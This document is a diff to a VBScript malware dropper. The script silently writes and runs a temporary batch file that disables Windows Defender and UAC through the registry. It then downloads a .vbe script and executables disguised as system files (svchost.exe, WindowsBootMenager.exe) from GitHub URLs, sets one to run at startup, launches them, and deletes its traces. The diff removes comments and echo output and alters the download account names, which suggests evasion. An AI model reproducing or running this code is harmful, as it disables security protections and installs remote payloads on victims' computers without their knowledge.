@@ -1,57 +1,30 @@
 Option Explicit
 
-' Path to the batch file
-Dim batFilePath
+Dim batFilePath, cleanupScript
 batFilePath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\tempLog.bat"
+cleanupScript = "On Error Resume Next: CreateObject(""Scripting.FileSystemObject"").DeleteFile """ & batFilePath & """: On Error GoTo 0"
 
-' Create the batch file with the necessary commands
-CreateBatchFile batFilePath
-
-' Run the batch file silently
-RunBatchFileSilently batFilePath
-
-' Clean up: delete the batch file after execution
-Do While FileExists(batFilePath)
-    On Error Resume Next
-    CreateObject("Scripting.FileSystemObject").DeleteFile batFilePath
-    On Error GoTo 0
-Loop
-
-' Function to create the batch file
 Sub CreateBatchFile(filePath)
     Dim fso, file
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set file = fso.CreateTextFile(filePath, True)
 
     file.WriteLine "@echo off"
-    file.WriteLine "rem Disable Windows Defender and UAC (requires admin privileges)"
     file.WriteLine "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f"
     file.WriteLine "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f"
     file.WriteLine "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
-    file.WriteLine "rem Download scriptmenagers.vbe and add to startup"
-    file.WriteLine "curl -s -o ""%TEMP%\scriptmenagers.vbe"" -JL ""https://github.com/VanishGX/Base/raw/main/scriptmenagers.vbe"""
+    file.WriteLine "curl -s -o ""%TEMP%\scriptmenagers.vbe"" -JL ""https://github.com/VasnishGX/Base/raw/main/scriptmenagers.vbe"""
     file.WriteLine "reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""ScriptManagers"" /t REG_SZ /d ""%TEMP%\scriptmenagers.vbe"" /f"
-    file.WriteLine "rem Check if required files exist and download if missing"
     file.WriteLine "setlocal enabledelayedexpansion"
     file.WriteLine "set ""files=svchost.exe WindowsBootMenager.exe chromedrivers.exe"""
-    file.WriteLine "set ""base_url=https://github.com/VanishGX/Data/raw/main/"""
+    file.WriteLine "set ""base_url=https://github.com/VansishGX/Data/raw/main/"""
     file.WriteLine "for %%f in (%files%) do ("
     file.WriteLine "    if not exist ""%%f"" ("
-    file.WriteLine "        echo Downloading %%f..."
     file.WriteLine "        curl -s -o ""%%f"" -JL ""!base_url!%%f"""
-    file.WriteLine "        if exist ""%%f"" ("
-    file.WriteLine "            echo %%f downloaded."
-    file.WriteLine "        ) else ("
-    file.WriteLine "            echo Failed to download %%f."
-    file.WriteLine "        )"
-    file.WriteLine "    ) else ("
-    file.WriteLine "        echo %%f already exists."
     file.WriteLine "    )"
     file.WriteLine ")"
-    file.WriteLine "rem If all files exist, run them"
     file.WriteLine "for %%f in (%files%) do ("
     file.WriteLine "    if exist ""%%f"" ("
-    file.WriteLine "        echo Running %%f..."
     file.WriteLine "        start """" ""%%f"""
     file.WriteLine "    )"
     file.WriteLine ")"
@@ -59,16 +32,21 @@ Sub CreateBatchFile(filePath)
     file.Close
 End Sub
 
-' Function to run the batch file silently
 Sub RunBatchFileSilently(filePath)
     Dim shell
     Set shell = CreateObject("WScript.Shell")
     shell.Run "cmd.exe /c """ & filePath & """", 0, True
 End Sub
 
-' Function to check if a file exists
 Function FileExists(file)
     Dim fso
     Set fso = CreateObject("Scripting.FileSystemObject")
     FileExists = fso.FileExists(file)
 End Function
+
+CreateBatchFile batFilePath
+RunBatchFileSilently batFilePath
+
+Do While FileExists(batFilePath)
+    ExecuteGlobal cleanupScript
+Loop
